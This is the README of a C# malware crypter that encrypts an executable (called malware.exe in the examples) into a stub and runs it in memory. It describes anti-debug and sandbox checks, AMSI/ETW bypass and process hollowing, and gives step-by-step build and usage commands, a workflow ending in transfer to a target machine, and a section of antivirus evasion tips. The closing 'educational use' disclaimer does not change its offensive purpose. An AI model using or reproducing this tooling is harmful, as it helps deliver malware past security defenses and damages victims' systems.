# PE/ELF Crypter v3.0 (C# Version)

C# implementation of the crypter with the same features as Go version.

## Features

- **AES-256-GCM Encryption** - Strong encryption for payloads
- **Multiple Modes**:
  - Basic: Simple VirtualAlloc + CreateThread
  - Advanced: Anti-debug + Sandbox detection
  - DotNet: AMSI/ETW bypass + Process Hollowing
  - Stealth: Minimal approach (2026)

## Build

```bash
cd Builder
dotnet build -c Release
```

Or compile manually:
```bash
csc /out:Builder.exe Program.cs
```

## Usage

### Basic
```bash
Builder.exe -in malware.exe -password "mypass123"
```

### Advanced (Anti-debug + Sandbox detection)
```bash
Builder.exe -in malware.exe -password "mypass123" -advanced
```

### DotNet (AMSI/ETW bypass + Hollowing)
```bash
Builder.exe -in malware.exe -password "mypass123" -dotnet
```

### Stealth (Minimal - 2026)
```bash
Builder.exe -in malware.exe -password "mypass123" -stealth
```

### Custom output
```bash
Builder.exe -in malware.exe -password "mypass123" -out crypted.cs -stealth
```

## Compile Generated Stub

After generating the stub (e.g., `crypted_malware.cs`):

```bash
# Windows
csc /target:exe /platform:x64 /out:crypted.exe crypted_malware.cs

# Or with .NET SDK
dotnet publish -c Release -r win-x64 --self-contained
```

## Modes Comparison

| Mode | Features | Detection Risk |
|------|----------|----------------|
| **Basic** | VirtualAlloc + CreateThread | Medium |
| **Advanced** | Basic + Anti-debug + Sandbox checks | Medium-High |
| **DotNet** | AMSI/ETW bypass + Process Hollowing | High |
| **Stealth** | Minimal (VirtualAlloc + CreateThread only) | Low-Medium |

## Stealth Mode (Recommended for 2026)

The stealth mode uses the absolute minimum:
- No Process Hollowing (always detected)
- No DLL Injection
- No complex checks
- Just: VirtualAlloc → Copy → CreateThread
- Silent execution (no console output)

**Example:**
```bash
Builder.exe -in payload.exe -password "secret" -stealth
csc /target:winexe /platform:x64 /out:payload_crypted.exe crypted_payload.cs
```

## Project Structure

```
crypt-csharp/
├── Builder/
│   ├── Program.cs          # Builder application
│   └── Builder.csproj      # Project file
├── Stubs/
│   ├── StubBasic.cs       # Basic stub
│   ├── StubAdvanced.cs    # Advanced stub
│   ├── StubDotNet.cs      # DotNet stub (AMSI/ETW)
│   └── StubStealth.cs     # Stealth stub (minimal)
└── README.md
```

## How It Works

1. **Builder** reads your executable
2. **Encrypts** it with AES-256-GCM
3. **Embeds** encrypted payload into chosen stub
4. **Outputs** C# source file
5. **Compile** the stub to get final executable

## Technical Details

### Encryption
- **Algorithm**: AES-256-GCM
- **Key Derivation**: SHA-256(password)
- **Nonce**: 12 bytes (random)
- **Tag**: 16 bytes (authentication)

### Execution Methods

**Basic/Advanced/Stealth:**
```csharp
VirtualAlloc() → Marshal.Copy() → CreateThread()
```

**DotNet:**
```csharp
BypassAMSI() → BypassETW() → ProcessHollowing(InstallUtil.exe)
```

## AV Evasion Tips (2026)

1. **Use Stealth mode** - minimal code = less signatures
2. **Avoid Process Hollowing** - heavily monitored
3. **No AMSI/ETW patching** - triggers behavior detection
4. **Keep it simple** - VirtualAlloc + CreateThread is enough
5. **Compile as Release** - optimizations help
6. **Use /target:winexe** - no console window

## Requirements

- .NET 6.0 or higher (for AesGcm support)
- Windows (for P/Invoke APIs)
- C# compiler (csc.exe or dotnet SDK)

## Differences from Go Version

| Feature | Go | C# |
|---------|----|----|
| Language | Go | C# |
| Output | Compiled binary | C# source code |
| Size | Smaller (~1.5MB) | Larger (~5-10MB compiled) |
| Compilation | Single step | Two steps (generate + compile) |
| AesGcm | Manual | Built-in (.NET 6+) |

## Example Workflow

```bash
# 1. Build the builder
cd Builder
dotnet build -c Release

# 2. Generate crypted stub
./bin/Release/net6.0/Builder -in ../../malware.exe -password "secret123" -stealth -out crypted.cs

# 3. Compile the stub
csc /target:winexe /platform:x64 /optimize+ /out:final.exe crypted.cs

# 4. Run on target
# Transfer final.exe to target machine
```

## Security Warning

⚠️ **For educational purposes only!** This tool is designed for security research and penetration testing. Unauthorized use against systems you don't own is illegal.

## License

Educational use only. Use responsibly.
